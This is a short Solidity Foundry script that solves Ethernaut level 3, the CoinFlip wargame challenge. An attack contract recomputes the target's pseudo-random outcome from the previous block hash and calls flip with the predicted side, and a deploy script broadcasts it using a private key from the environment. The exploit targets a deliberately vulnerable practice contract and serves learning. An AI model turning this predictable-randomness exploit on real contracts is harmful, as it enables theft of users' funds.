// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {CoinFlip} from "../src/ethernaut3.sol";

contract CoinFlipAttack {
    CoinFlip constant TARGET =
        CoinFlip(0x58FD31736a649C2C5167c98D6d323E56c1E7f59d);

    uint256 constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;

        bool side = coinFlip == 1;

        TARGET.flip(side);
    }
}

contract Ethernaut3Script is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        CoinFlipAttack attackContract = new CoinFlipAttack();

        attackContract.attack();

        vm.stopBroadcast();
    }
}